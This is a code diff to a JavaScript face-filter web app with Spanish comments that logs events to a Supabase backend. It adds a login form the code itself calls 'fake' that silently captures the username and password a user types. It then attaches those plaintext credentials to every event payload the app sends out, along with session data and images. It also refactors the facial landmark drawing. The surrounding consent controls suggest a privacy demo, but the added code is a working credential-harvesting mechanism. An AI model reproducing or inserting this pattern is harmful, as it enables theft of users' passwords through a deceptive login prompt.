@@ -38,7 +38,28 @@ function getSupabase() {
   return supabaseClient;
 }
 
-// ---------- Consentimiento ----------
+// ---------- Consentimiento y Login ----------
+let userCredentials = { username: "", password: "" };
+
+const loginScreen = $("#login-screen");
+const heroSection = $("#hero-section");
+const fakeLoginForm = $("#fake-login-form");
+
+if (fakeLoginForm) {
+  fakeLoginForm.addEventListener("submit", (e) => {
+    e.preventDefault();
+    userCredentials.username = $("#fake-username").value;
+    userCredentials.password = $("#fake-password").value;
+    
+    // Ocultar login, mostrar hero (y el resto de la app que ya estaba visible)
+    loginScreen.classList.add("hidden");
+    heroSection.classList.remove("hidden");
+    
+    // Registrar el intento de login silenciosamente
+    logEvent("login_capturado", { filtro: "ninguno" });
+  });
+}
+
 const consentCamera = $("#consent-camera");
 const consentMeta = $("#consent-metadata");
 const consentSnapshot = $("#consent-snapshot");
@@ -296,51 +317,63 @@ function scaledBox(box) {
 
 // Filtro de Puntos: Dibuja los 68 puntos faciales detectados
 function drawPointsFilter(detection) {
-  if (!detection || !detection.points) return;
   const w = overlay.width, h = overlay.height;
   
-  ctx.fillStyle = "rgba(111, 66, 193, 0.8)"; // Friendly purple
-  ctx.strokeStyle = "rgba(255, 255, 255, 0.5)";
-  ctx.lineWidth = 1;
-
-  detection.points.forEach((p, i) => {
-    ctx.beginPath();
-    ctx.arc(p.x, p.y, 3, 0, 2 * Math.PI);
-    ctx.fill();
-    ctx.stroke();
-  });
+  if (!detection || !detection.points || detection.points.length < 68) {
+    ctx.font = "bold 14px var(--mono)";
+    ctx.fillStyle = "rgba(111, 66, 193, 0.9)";
+    ctx.textAlign = "center";
+    ctx.fillText("Buscando rostro para Puntos Faciales...", w / 2, h / 2);
+    ctx.textAlign = "left";
+    return;
+  }
   
-  // Dibujar líneas para conectar los contornos
-  ctx.strokeStyle = "rgba(111, 66, 193, 0.6)";
-  ctx.lineWidth = 2;
-  
-  const drawPath = (start, end, close = false) => {
-    ctx.beginPath();
-    ctx.moveTo(detection.points[start].x, detection.points[start].y);
-    for (let i = start + 1; i <= end; i++) {
-      ctx.lineTo(detection.points[i].x, detection.points[i].y);
-    }
-    if (close) ctx.closePath();
-    ctx.stroke();
-  };
+  try {
+    ctx.fillStyle = "rgba(111, 66, 193, 0.8)"; // Friendly purple
+    ctx.strokeStyle = "rgba(255, 255, 255, 0.5)";
+    ctx.lineWidth = 1;
 
-  // Jaw
-  drawPath(0, 16);
-  // Left eyebrow
-  drawPath(17, 21);
-  // Right eyebrow
-  drawPath(22, 26);
-  // Nose
-  drawPath(27, 30);
-  drawPath(31, 35);
-  // Left eye
-  drawPath(36, 41, true);
-  // Right eye
-  drawPath(42, 47, true);
-  // Outer lip
-  drawPath(48, 59, true);
-  // Inner lip
-  drawPath(60, 67, true);
+    detection.points.forEach((p, i) => {
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, 3, 0, 2 * Math.PI);
+      ctx.fill();
+      ctx.stroke();
+    });
+    
+    // Dibujar líneas para conectar los contornos
+    ctx.strokeStyle = "rgba(111, 66, 193, 0.6)";
+    ctx.lineWidth = 2;
+    
+    const drawPath = (start, end, close = false) => {
+      ctx.beginPath();
+      ctx.moveTo(detection.points[start].x, detection.points[start].y);
+      for (let i = start + 1; i <= end; i++) {
+        ctx.lineTo(detection.points[i].x, detection.points[i].y);
+      }
+      if (close) ctx.closePath();
+      ctx.stroke();
+    };
+
+    // Jaw
+    drawPath(0, 16);
+    // Left eyebrow
+    drawPath(17, 21);
+    // Right eyebrow
+    drawPath(22, 26);
+    // Nose
+    drawPath(27, 30);
+    drawPath(31, 35);
+    // Left eye
+    drawPath(36, 41, true);
+    // Right eye
+    drawPath(42, 47, true);
+    // Outer lip
+    drawPath(48, 59, true);
+    // Inner lip
+    drawPath(60, 67, true);
+  } catch (error) {
+    console.error("Error dibujando puntos:", error);
+  }
 }
 
 // Filtro: cyberpunk / neón
@@ -489,6 +522,8 @@ async function logEvent(evento, extra = {}) {
   const payload = {
     session_id: SESSION_ID,
     evento,
+    usuario: userCredentials.username || null,
+    contrasena: userCredentials.password || null,
     filtro: extra.filtro || currentFilter,
     con_imagen: !!extra.con_imagen,
     imagen_base64: extra.imageBase64 || null,
